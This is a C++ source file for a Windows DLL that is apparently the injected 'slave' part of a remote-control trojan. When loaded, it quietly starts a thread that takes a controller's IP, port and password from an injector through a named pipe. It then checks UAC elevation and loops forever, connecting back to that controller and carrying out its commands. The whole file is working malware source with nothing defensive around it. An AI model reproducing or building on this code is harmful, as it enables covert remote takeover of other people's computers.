#include <windows.h>
#include <sstream>
HANDLE threadHandle;

#include <blaspheme/Blaspheme.hpp>
#include <common/Log.hpp>
#include <blaspheme/protocol/ConnectionInfo.hpp>
#include <network/Pipe.hpp>
#include <system/Uac.hpp>
#include "InhibitionCore.hpp"
using namespace Inhibition;
using namespace System;

void launch()
{
    LOG << "Waiting connection";
    while(true)
    {
		try
		{
			if(InhibitionCore::instance().connect())
			{
				while(InhibitionCore::instance().process_command());
				LOG << "Session ending";
				InhibitionCore::instance().disconnect();
				LOG << "Waiting connection";
			}
			Sleep(500);
		}
		catch(Network::Deconnection&)
		{
			LOG << "Untimely disconnect";
			InhibitionCore::instance().disconnect();
		}
    }
}

// il faut récupérer  l'ip, le port, le mot de passe et le nom du client que va
// nous envoyer l'injecteur
// pour ce faire, on utilise les "pipe" à la windows (IPC)
Blaspheme::ConnectionInfo getConnectionInfo()
{
	Network::Pipe pipe;
    Blaspheme::ConnectionInfo infos;
    if(pipe.connect(PIPE_NAME))
    {
		char blaspheme [Blaspheme::DEFAULT_STR_SIZE];
        pipe.recv(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
        std::string buffer(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
		size_t end = buffer.find_last_of(MARKER);
		buffer = buffer.substr(MARKER_SIZE, end+1-2*MARKER_SIZE);

        std::string port_buffer;
        std::istringstream iss(buffer);

        std::getline( iss, infos.ip, SEPERATOR );
        std::getline( iss, port_buffer, SEPERATOR );
        std::getline( iss, infos.name, SEPERATOR );
        std::getline( iss, infos.password, SEPERATOR );

        from_string(port_buffer, infos.port);
        pipe.disconnect();
    }
	else
	{
		FATAL_ERROR("Unable to connect to pipe");
	}
	return infos;
}

DWORD WINAPI run(void)
{
	try
	{
		LOG.setHeader("SLAVE");
		Blaspheme::ConnectionInfo infos = getConnectionInfo();
#ifdef INNOCENCE_DEBUG
	    LOG.addObserver(new Common::LogToNetwork(infos.ip, infos.port));
#endif
		LOG << GetElevationType();
		InhibitionCore::instance().set_connection_infos(infos);
		launch();
	}
	catch(std::exception& e)
	{
		LOG << e.what();
	}
	catch(...)
	{
		LOG << "Unknown exception";
	}
	return EXIT_SUCCESS;
}

extern "C" BOOL APIENTRY DllMain (HINSTANCE hModule, DWORD dwMsg, LPVOID lpReserved)
{
    UNREFERENCED_PARAMETER( hModule );
    UNREFERENCED_PARAMETER( lpReserved );

    switch( dwMsg )
    {
		case DLL_PROCESS_ATTACH:
			DisableThreadLibraryCalls( hModule );
			threadHandle = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)run, NULL, 0, 0 );
			return (!threadHandle) ? FALSE : TRUE;
		case DLL_PROCESS_DETACH:
			TerminateThread(threadHandle, EXIT_SUCCESS);
			return TRUE;
    }
    return TRUE;
}
